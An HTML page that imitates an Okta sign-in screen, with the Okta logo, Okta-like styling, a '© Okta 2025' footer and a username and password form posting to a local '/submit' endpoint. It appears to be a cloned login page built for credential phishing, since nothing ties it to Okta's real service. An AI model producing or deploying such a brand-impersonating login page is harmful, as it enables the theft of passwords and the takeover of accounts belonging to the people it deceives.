<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Sign In - Okta</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body {
            background-color: #f2f2f2;
            font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
            margin: 0;
            padding: 0;
        }
        .container {
            max-width: 400px;
            margin: 80px auto;
            background-color: #ffffff;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            padding: 40px;
            border-radius: 8px;
        }
        .logo {
            text-align: center;
            margin-bottom: 20px;
        }
        .logo img {
            width: 140px;
        }
        h2 {
            color: #2d2d2d;
            font-weight: normal;
            text-align: center;
            margin-bottom: 20px;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 12px;
            margin-bottom: 16px;
            border: 1px solid #d6d6d6;
            border-radius: 4px;
            font-size: 16px;
        }
        .button {
            width: 100%;
            padding: 10px;
            background-color: #007dc1;
            color: white;
            font-size: 16px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        .button:hover {
            background-color: #005a8c;
        }
        .link {
            text-align: right;
            margin-top: 8px;
        }
        .link a {
            color: #007dc1;
            text-decoration: none;
            font-size: 13px;
        }
        .link a:hover {
            text-decoration: underline;
        }
        .footer {
            text-align: center;
            font-size: 11px;
            color: #999;
            margin-top: 30px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/5/5c/Okta_logo.svg" alt="Okta">
        </div>
        <h2>Sign In</h2>
        <form action="/submit" method="POST">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button class="button" type="submit">Sign In</button>
        </form>
        <div class="link">
            <a href="#">Need help signing in?</a>
        </div>
        <div class="footer">
            Â© Okta 2025
        </div>
    </div>
</body>
</html>
